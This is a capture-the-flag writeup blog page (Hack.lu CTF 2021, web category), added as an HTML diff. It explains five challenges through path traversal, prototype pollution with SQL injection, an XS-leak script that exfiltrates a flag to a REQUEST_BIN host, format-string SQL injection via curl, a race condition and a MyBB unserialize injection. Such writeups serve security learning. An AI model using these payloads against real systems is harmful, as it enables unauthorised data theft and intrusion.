@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Hack.lu CTF 2021 Web Writeup | Black Bauhinia</title>
+
+<meta name="keywords" content="ctf, hacklu-ctf, web" />
+<meta name="description" content="Because there are not many Crypto listed in the &quot;Stock Market&quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time.">
+<meta name="author" content="Ozetta">
+<link rel="canonical" href="https://b6a.black/posts/2021-11-04-hacklu-web/" />
+<link href="/assets/css/stylesheet.min.933fbeab943585aa913b5175ee7291733f28815597926f1e56aacc964d807245.css" integrity="sha256-kz&#43;&#43;q5Q1haqRO1F17nKRcz8ogVWXkm8eVqrMlk2AckU=" rel="preload stylesheet"
+    as="style">
+
+<link rel="icon" href="https://b6a.black/favicon.ico">
+
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.68.3" />
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-M67YZZ2MP1');
+</script>
+
+
+
+<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 
+
+
+<meta property="og:title" content="Hack.lu CTF 2021 Web Writeup" />
+<meta property="og:description" content="Because there are not many Crypto listed in the &quot;Stock Market&quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b6a.black/posts/2021-11-04-hacklu-web/" />
+<meta property="article:published_time" content="2021-11-04T20:50:00+08:00" />
+<meta property="article:modified_time" content="2021-11-04T20:50:00+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack.lu CTF 2021 Web Writeup"/>
+<meta name="twitter:description" content="Because there are not many Crypto listed in the &quot;Stock Market&quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time."/>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Hack.lu CTF 2021 Web Writeup",
+  "name": "Hack.lu CTF 2021 Web Writeup",
+  "description": "Because there are not many Crypto listed in the \u0026amp;quot;Stock Market\u0026amp;quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web …",
+  "keywords": [
+    "ctf", "hacklu-ctf", "web"
+  ],
+  "articleBody": "Because there are not many Crypto listed in the \"Stock Market\", our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time.\ntrading-api ($285, 20 solves) The objective of this challenge is to get the flag from a PostgreSQL database. First, you need to get an auth token before accessing the API with SQL queries.\n// server.js app.post('/api/auth/login', login); // authn.js const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, { headers: { authorization: AUTH_API_TOKEN }, json: { password }, });  Well encodeURI not encodeURIComponent? I didn't even bother to read the auth service API and try the username with ../../health? and it works!\nThen there is an annoying checking on the /api/priv/ endpoint:\napp.use(authz({ userPermissions: new Map(Object.entries({ warrenbuffett69: [Permissions.VERIFIED], })), routePermissions: [ [/^\\/+api\\/+priv\\//i, Permissions.VERIFIED], ], }));  I thought we need to craft another JWT token (JSON Web Token token?) with the username warrenbuffett69 but apparently we also need a funnier username (../../health? is not funny enough) to do SQLi next.\n(Mystiz actually found the SQLi already because we can bypass this shit) After several hours of fuzzing, none of those .. or weird unicode works as expected. And then I tried to check how express checks the route but I have no idea. Instead I found this: https://github.com/expressjs/express/blob/master/lib/router/index.js#L190\nWhy there is protohost in req.url? Then I tried http://z/api/priv/ (instead of /api/priv/) as the request URL and it works! (Typically, proxy server will accept absolute path as URL1)\nFinally it is the main dish:\napp.put('/api/priv/assets/:asset/:action', async (req, res) = { const { username } = req.user const { asset, action } = req.params; if (/[^A-z]/.test(asset)) { return res.status(400).send('asset name must be letters only'); } const assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action; try { await makeTransaction(username, txId, asset, action === 'buy' ? 1 : -1); res.json({ id: txId }); } catch (error) { console.error('db error:', error.message); res.status(500).send('transaction failed'); } finally { delete assetTransactions[txId]; } }); async function makeTransaction(username, txId, asset, amount) { const query = prepare('INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)', { amount, asset, username, txId, }); await db.query(query); }  Uh-oh prepared statement... Let's see how it works:\nfunction sqlEscape(value) { switch (typeof value) { case 'string': return `'${value.replace(/[^\\x20-\\x7e]|[']/g, '')}'`; case 'number': return isFinite(value) ? String(value) : sqlEscape(String(value)); case 'boolean': return String(value); default: return value == null ? 'NULL' : sqlEscape(JSON.stringify(value)); } } function prepare(query, namedParams) { let filledQuery = query; const escapedParams = Object.fromEntries( Object.entries(namedParams) .map(([key, value]) = ([key, sqlEscape(value)])) ); for (const key in escapedParams) { filledQuery = filledQuery.replaceAll(`:${key}`, escapedParams[key]); } return filledQuery; }  sqlEscape will eat the single quote from your string input (and add a pair of single quote), so changing the username (or asset) to ../../health?' blah will not work. No luck? When you see a lot of Objects[key] (having Object[key1][key2] is the best) in a js challenge, you can try prototype pollution:\nconst assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action;  which is just like transactions[asset][txId] = action; which fits the Object[key1][key2] form, then we can just fill key1 as __proto__ and we can control asset and action as a string. So we got a prototype pollution on a property of ... a generated ID... but this prototype property will be appeared in escapedParams as well, so if we know the ID (e.g. 1337), then having the username as ../../health? :1337 with action ' blah -- will make the SQL statement looks like\nINSERT INTO transactions (id, asset, amount, username) VALUES (1337, '__proto__', -1, '../../health? ' blah --') (I know it is broken lol) But how can we get the generated ID? You can't before it shows the result... so instead of putting :1337 as the placeholder, we can put ::txId as the placeholder, so that it will be replaced to the placeholder for the generated ID later.\nTo sum up:\n Get a token with a funny username that contains ::txId, e.g. ../../health? ::txId Access the /api/priv/ endpoint with prototype pollution and SQLi while bypassing the check: PUT http://z/api/priv/assets/__proto__/'%7C%7C(select%09flag%09from%09flag)%7C%7C' HTTP/1.1 Authorization: eySomeToken Host: z ?? Profit  Then you can use the /api/transactions/:id endpoint with the generated ID shown in the transaction result to get the flag.\nBookmarker ($333, 14 solves) Note App + XSS Bot again. But apparently there is no XSS. There is a filter function:\nlet username = req.session.username let {filter} = req.query let query = {username} if(filter){ query.title = { $regex: escapeStringRegexp(filter) } } let items = await Links.find(query).sort({date: -1})  Regular Expression Filter, ReDoS again? But wait there is escapeStringRegexp which seems to be working well. So we need other oracle to check whether the admin's bookmark title (i.e. the flag) contains certain character. Then I found that there is a subtle difference in index.ejs:\n% if(typeof items != 'undefined' \u0026\u0026 items.length){ % script window.onload = () = { document.querySelectorAll('.deletebtn').forEach((button)= { button.onclick = async () = { // delete link with id  fetch(`/delete?id=${button.dataset.id}`, { method: 'GET', credentials: 'include', }) .then(x = x.json()) .then((j) = { console.log(j) }) // remove from dom  button.parentElement.parentElement.parentElement.remove() } }) } script % } % That means if the query got no results, it won't include the script for deleting link. Now we can add more security protection to the page, and then we can use our favorite censorship oracle (i.e. Streisand effect) to detect what are the interesting information... lol\nNot blocked:\niframe src=\"https://bookmarker.flu.xxx/?filter=not_found\" csp=\"script-src 'none'\"iframe Blocked:\niframe src=\"https://bookmarker.flu.xxx/?filter=found\" csp=\"script-src 'none'\"iframe The oracle here is the blocked one will be loaded relatively faster. By generating N iframes with onload event, the first triggered event will indicate what is the detected character:\nhtml head script var o = {}; var c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}'; var payload = 'flag{'; var load = 1; function s(){ load = 1; for(i=0;i64;i++){ q(i); } } function q(x){ o[x] = document.createElement('iframe'); o[x].src = 'https://bookmarker.flu.xxx/?filter='+payload+c[x]+'\u0026'+Math.random(); o[x].onload = function(){eval(`z(`+x+`);`)}; o[x].csp = \"script-src 'none'\"; document.body.appendChild(o[x]); } function z(x){ document.body.removeChild(o[x]); document.body.innerHTML = ''; if (load) { payload += c[x]; load = 0; } if(x!=63){ setTimeout(\"s()\",100); //take a short break lol  } if (x==63){ fetch(\"http://REQUEST_BIN/?flag=\"+payload, {mode: 'no-cors'}); } } onload = s; script head body body html (Don't ask me how did I name the variables and function names)\nDiamond Safe ($181, 61 solves) The objective is to read /flag.txt, and first you need to login to the system:\nif (isset($_POST['password'])){ $query = db::prepare(\"SELECT * FROM `users` where password=sha1(%s)\", $_POST['password']); if (isset($_POST['name'])){ $query = db::prepare($query . \" and name=%s\", $_POST['name']); } Prepared statement? Let's see how did it prepare:\npublic static function prepare($query, $args){ if (is_null($query)){ return; } if (strpos($query, '%') === false){ error('%s not included in query!'); return; } // get args $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) \u0026\u0026 count($args) == 1 ) { $args = $args[0]; $args_is_array = true; } $count_format = substr_count($query, '%s'); if($count_format !== count($args)){ error('Wrong number of arguments!'); return; } // escape foreach ($args as \u0026$value){ $value = static::$db-real_escape_string($value); } // prepare $query = str_replace(\"%s\", \"'%s'\", $query); $query = vsprintf($query, $args); return $query; } Since the statement is prepared twice (one for the password and the other one for username), obviously it is format string placeholder injection. Typically it is injecting %c with value 39 to add one more single quote to break everything, but the above prepare function also checks whether the number of %s and the number of arguments supplied match, so we need to inject another %s if we want to make sure the vsprintf works later.\nFirst, the statement looks like this before prepare on password:\nSELECT * FROM `users` where password=sha1(%s) Let's just set the password as %s, then it will become like this after the vsprintf:\nSELECT * FROM `users` where password=sha1('%s') Looks no difference? See where are the single quotes...\nThen we have another prepare statement for the username. Before it prepare:\nSELECT * FROM `users` where password=sha1('%s') and name=%s Now you should see what went wrong. Let's say we supply the username as ['foo','bar'], the statement will become:\nSELECT * FROM `users` where password=sha1(''foo'') and name='bar' Looks broken isn't it? Then it is like SQLi 101, just change the foo to some interesting things like ) or 1 --, then you can login:\ncurl https://diamond-safe.flu.xxx/login.php -d \"name[]=) or 1 -- \u0026name[]=1\u0026password=%s\" -i Next, we want to download the flag. But there is an integrity check on the filename with the hash:\nfunction check_url(){ // fixed bypasses with arrays in get parameters $query = explode('\u0026', $_SERVER['QUERY_STRING']); $params = array(); foreach( $query as $param ){ // prevent notice on explode() if $param has no '=' if (strpos($param, '=') === false){ $param += '='; } list($name, $value) = explode('=', $param, 2); $params[urldecode($name)] = urldecode($value); } if(!isset($params['file_name']) or !isset($params['h'])){ return False; } $secret = getenv('SECURE_URL_SECRET'); $hash = md5(\"{$secret}|{$params['file_name']}|{$secret}\"); if($hash === $params['h']){ return True; } return False; } Why use the query string instead of $_GET... Looks like a bad excuse for the comment. Anyway we can just keep the original file_name and h in the query string for a valid file, and then add something that can replace the $_GET['file_name']. One way is file name as PHP replaces space with underscore from query string to $_GET:\nhttps://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013\u0026file_name=FlagNotHere.txt\u0026file%20name=../../../flag.txt NodeNB ($198, 45 solves) The objective is to read the note with id flag. However, there is an authorization and you are allowed to read the flag only if either\n you are the owner of the note (there are no owners for the note flag), or you do not have a password (this happens only if you are a system user).  async deleteUser(uid) { const user = await helpers.getUser(uid); await db.set(`user:${user.name}`, -1); await db.del(`uid:${uid}`); // ☝️ Deletes the entire user. The user does not have a password now.  const sessions = await db.smembers(`uid:${uid}:sessions`); const notes = await db.smembers(`uid:${uid}:notes`); return db.del([ ...sessions.map((sid) = `sess:${sid}`), // ☝️ The sessions are invalidated here  ...notes.map((nid) = `note:${nid}`), `uid:${uid}:sessions`, `uid:${uid}:notes`, ]); },  Mystiz observed that there is a gap between deleting the user and invalidating the sessions. A user can read arbitrary notes during the time in between. To achieve this, he tried to increase the time by inserting a lot of notes (he attempted to make 1024 notes) and delete the user. Unfortunately he was unable to cast the attack.\nActually there is a sleep function in one of the endpoint that could help us to conduct the race condition attack:\napp.post('/notes', ensureAuth, async (req, res) = { let { title, content } = req.body; if (req.query.random) { const ms = Math.floor(2000 + Math.random() * 1000); await new Promise(r = setTimeout(r, ms));  So instead of inserting tons of notes (which should work theoretically if the amount is very large), we can just request a few random notes that will sleep for a while. Then we can run delete and read at the same time:\nfor(i=0;i100;i++){fetch('/notes?random=1',{'method':'POST','headers':{'content-type':'application/x-www-form-urlencoded'},'body':'title='+Math.random()})}; fetch('/deleteme',{'method':'POST'}); fetch('/notes/flag').then(e=e.text()).then(e=console.log(e));  SeekingExploits ($367, 11 solves) The challenge is written based on an open source forum, MyBB. A plugin called ExploitMarket is implemented. There are two APIs implemented:\n make_proposal makes a proposal delete_proposals clears the proposal of the current user.  Additionally, when a user sends a private message to another user, the list of proposals will be included as a signature.\nThe flag is hidden inside the database. It is hidden in the private notes of the admin. That said, we need to either sign in as an admin (which sounds infeasible for a public CMS) or perform SQL injection.\nIn mybb-server/exploit_market/inc/plugins/emarket.php, there is an obvious SQL injection:\n$user_query = $db-simple_select(\"users\", \"username\", \"uid=\" . $proposal[\"additional_info\"]['sold_to']); additional_info is unserialized with my_unserialize and sold_to is used directly without validation. That said, if sold_to is a string, we can easily craft an SQL injection easily (the insert_query function in MyBB simply concatenates the function parameters).\nUnfortunately the fields in additional_info are validated when the content is added. Snippeted:\nfunction validate_additional_info($additional_info) { $validated = array(); foreach($additional_info as $key = $value) { switch ($key) { case \"reliability\": { $value = (int)$value; if ($value = 0 \u0026\u0026 $value = 100) { $validated[\"reliability\"] = $value; } break; } case \"impact\": { $valid_impacts = array(\"rce\", \"priv_esc\", \"information_disclosure\"); if (in_array($value, $valid_impacts, true)) { $validated[\"impact\"] = $value; } break; } case \"current_bidding\": case \"sold_to\": { $validated[$key] = (int)$value; break; } default: { $validated[$key] = $value; } } } return $validated; } Although the keys other than reliability, impact, current_bidding and sold_to are not validated and will be added to the return object directly for serialization, only sold_to is shown to the user. It seemed that every other key except sold_to are not important because they do not affect the rendered result... or is it?\nThese (un)serialization will use _safe_unserialize / _safe_serialize, which look safe (as the name suggested lol). Then how can we have a sold_to with SQLi payload after unserialize while bypassing the check during the serialization? Maybe there are some mutation when it writes to the database and reads differently afterwards. A typically case is data truncation in SQL, but the column data type here is TEXT, and also having a left substring of the serialized string seems not very helpful in crafting a nice payload that changes the sold_to later.\nMaybe it is about Multibyte character exploit? Sounds like the infamous 許功蓋 in the 90s. Just randomly add some characters from [\\x80-\\xff] and see what's going on:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026additional_info[%ee]=1\u0026additional_info[sold_to]=1 This will make the buyer empty (instead of Admin), meaning it breaks the serialized string in some way.\nThen we observe what is the actual serialized string looks like for different cases:\nadditional_info[e%ee]=1\u0026additional_info[sold_to]=1:\na:2:{s:2:\"e?;s:1:\"1\";s:7:\"sold_to\";i:1;} additional_info[%ee%ee]=1\u0026additional_info[sold_to]=1:\na:2:{s:2:\"?\";s:1:\"1\";s:7:\"sold_to\";i:1;} As you can see, the length of first string is the number of bytes we entered but the output may contain something less than that. So basically we need to craft a serialized string that will unserialized to Array(\"somejunk1\"=\"somejunk2\",\"sold_to\"=\"payload\")\nHow? I don't know... Just do some trial and error. Before I finish crafting, Mystiz has already got a working payload:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ec]=%22;s:0:%22%22;s:7:%22sold_to%22;s:53:%22-1%20union%20select%20usernotes%20from%20mybb_users%20where%20uid=1\u0026additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee]=1\u0026additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ef]=2 which looks like\na:3:{s:8:\"?;s:82:\"\";s:0:\"\";s:7:\"sold_to\";s:53:\"-1 union select usernotes from mybb_users where uid=1\";s:15:\"????????;s:1:\"1\";s:15:\"????????;s:1:\"2\";} Looks horrible isn't it? Somehow it includes the serialized string s:7:\"sold_to\";s:(some_number):\"some_payload\" inside one of the input. I personally think that having that s:53 is troublesome. Instead, I tried to have ;s:7:\"sold_to as one of the key, and then the value and the value length should be generated automatically...\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%eex]=;s:6:\u0026additional_info[;s:7:%22sold_to]=payload(What it interprets) K ************* ******* V ****** ******* a:2:{s:13:\"???????\";s:5:\";s:6:\";s:13:\";s:7:\"sold_to\";s:7:\"payload\";} K ******* ************* V ***** ******* (What I entered)  Mozilla (2021) \"HTTP Messages\"\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Messages [return]   ",
+  "wordCount" : "2392",
+  "inLanguage": "en",
+  "datePublished": "2021-11-04T20:50:00+08:00",
+  "dateModified": "2021-11-04T20:50:00+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "Ozetta"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b6a.black/posts/2021-11-04-hacklu-web/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Black Bauhinia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b6a.black/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+</head>
+
+<body class=" dark" id="top">
+<noscript>
+    <style type="text/css">
+        .theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
+            <span class="logo-switches">
+                
+                
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://b6a.black/about-us/" title="About Us">
+                    <span>About Us</span>
+                </a>
+            </li></ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+
+    <h1 class="post-title">
+      Hack.lu CTF 2021 Web Writeup
+    </h1>
+    <div class="post-meta">
+
+November 4, 2021&nbsp;·&nbsp;Ozetta
+
+</div>
+  </header>
+  
+  
+  <div class="post-content js-toc-content">
+<p>Because there are not many Crypto listed in the &quot;Stock Market&quot;, our <del>Cryptotrader</del> Cryptanalyst <em>Mystiz</em> joined us for bounty hunting in Web as well, and we got all Web challenges done this time.</p>
+
+<h2 id="tradingapi-285-20-solves">trading-api ($285, 20 solves)<a hidden class="anchor" aria-hidden="true" href="#tradingapi-285-20-solves">#</a></h2>
+
+<p>The objective of this challenge is to get the flag from a PostgreSQL database. First, you need to get an auth token before accessing the API with SQL queries.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// server.js
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/auth/login&#39;</span>, <span style="color:#a6e22e">login</span>);
+
+<span style="color:#75715e">// authn.js
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">got</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">`</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">AUTH_SERVICE</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/api/users/</span><span style="color:#e6db74">${</span>encodeURI(<span style="color:#a6e22e">username</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">/auth`</span>, {
+    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">authorization</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">AUTH_API_TOKEN</span> },
+    <span style="color:#a6e22e">json</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">password</span> },
+});
+</code></pre></div>
+<p>Well <code>encodeURI</code> not <code>encodeURIComponent</code>? I didn't even bother to read the auth service API and try the username with <code>../../health?</code> and it works!</p>
+
+<p>Then there is an annoying checking on the <code>/api/priv/</code> endpoint:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">authz</span>({
+    <span style="color:#a6e22e">userPermissions</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Map</span>(Object.<span style="color:#a6e22e">entries</span>({
+        <span style="color:#a6e22e">warrenbuffett69</span><span style="color:#f92672">:</span> [<span style="color:#a6e22e">Permissions</span>.<span style="color:#a6e22e">VERIFIED</span>],
+    })),
+    <span style="color:#a6e22e">routePermissions</span><span style="color:#f92672">:</span> [
+        [<span style="color:#e6db74">/^\/+api\/+priv\//i</span>, <span style="color:#a6e22e">Permissions</span>.<span style="color:#a6e22e">VERIFIED</span>],
+    ],
+}));
+</code></pre></div>
+<p>I thought we need to craft another JWT token (JSON Web Token token?) with the username <code>warrenbuffett69</code> but apparently we also need a funnier username (<code>../../health?</code> is not funny enough) to do SQLi next.</p>
+
+<p>(<em>Mystiz</em> actually found the SQLi already because we can bypass this shit) After several hours of fuzzing, none of those <code>..</code> or weird unicode works as expected. And then I tried to check how express checks the route but I have no idea. Instead I found this:
+<a href="https://github.com/expressjs/express/blob/master/lib/router/index.js#L190">https://github.com/expressjs/express/blob/master/lib/router/index.js#L190</a></p>
+
+<p>Why there is <code>protohost</code> in <code>req.url</code>? Then I tried <code>http://z/api/priv/</code> (instead of <code>/api/priv/</code>) as the request URL and it works!  (Typically, proxy server will accept absolute path as URL<sup class="footnote-ref" id="fnref:absolute-path-as-url"><a class="footnote" href="#fn:absolute-path-as-url">1</a></sup>)</p>
+
+<p>Finally it is the main dish:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#39;/api/priv/assets/:asset/:action&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">username</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">user</span>
+
+    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">asset</span>, <span style="color:#a6e22e">action</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/[^A-z]/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">asset</span>)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;asset name must be letters only&#39;</span>);
+    }
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">assetTransactions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">transactions</span>[<span style="color:#a6e22e">asset</span>] <span style="color:#f92672">??</span> (<span style="color:#a6e22e">transactions</span>[<span style="color:#a6e22e">asset</span>] <span style="color:#f92672">=</span> {});
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">txId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateId</span>();
+    <span style="color:#a6e22e">assetTransactions</span>[<span style="color:#a6e22e">txId</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">action</span>;
+
+    <span style="color:#66d9ef">try</span> {
+        <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">makeTransaction</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">txId</span>, <span style="color:#a6e22e">asset</span>, <span style="color:#a6e22e">action</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;buy&#39;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">:</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">txId</span> });
+    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;db error:&#39;</span>, <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span>);
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;transaction failed&#39;</span>);
+    } <span style="color:#66d9ef">finally</span> {
+        <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">assetTransactions</span>[<span style="color:#a6e22e">txId</span>];
+    }
+});
+
+<span style="color:#a6e22e">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">makeTransaction</span>(<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">txId</span>, <span style="color:#a6e22e">asset</span>, <span style="color:#a6e22e">amount</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#39;INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)&#39;</span>, {
+        <span style="color:#a6e22e">amount</span>,
+        <span style="color:#a6e22e">asset</span>,
+        <span style="color:#a6e22e">username</span>,
+        <span style="color:#a6e22e">txId</span>,
+    });
+
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">query</span>(<span style="color:#a6e22e">query</span>);
+}
+</code></pre></div>
+<p>Uh-oh prepared statement... Let's see how it works:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sqlEscape</span>(<span style="color:#a6e22e">value</span>) {
+    <span style="color:#66d9ef">switch</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">value</span>) {
+        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;string&#39;</span><span style="color:#f92672">:</span>
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">`&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/[^\x20-\x7e]|[&#39;]/g</span>, <span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>;
+        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;number&#39;</span><span style="color:#f92672">:</span>
+            <span style="color:#66d9ef">return</span> isFinite(<span style="color:#a6e22e">value</span>) <span style="color:#f92672">?</span> String(<span style="color:#a6e22e">value</span>) <span style="color:#f92672">:</span> <span style="color:#a6e22e">sqlEscape</span>(String(<span style="color:#a6e22e">value</span>));
+        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;boolean&#39;</span><span style="color:#f92672">:</span>
+            <span style="color:#66d9ef">return</span> String(<span style="color:#a6e22e">value</span>);
+        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#39;NULL&#39;</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">sqlEscape</span>(<span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">value</span>));
+    }
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">prepare</span>(<span style="color:#a6e22e">query</span>, <span style="color:#a6e22e">namedParams</span>) {
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filledQuery</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>;
+
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">escapedParams</span> <span style="color:#f92672">=</span> Object.<span style="color:#a6e22e">fromEntries</span>(
+        Object.<span style="color:#a6e22e">entries</span>(<span style="color:#a6e22e">namedParams</span>)
+              .<span style="color:#a6e22e">map</span>(([<span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span>]) =&gt; ([<span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">sqlEscape</span>(<span style="color:#a6e22e">value</span>)]))
+    );
+
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">escapedParams</span>) {
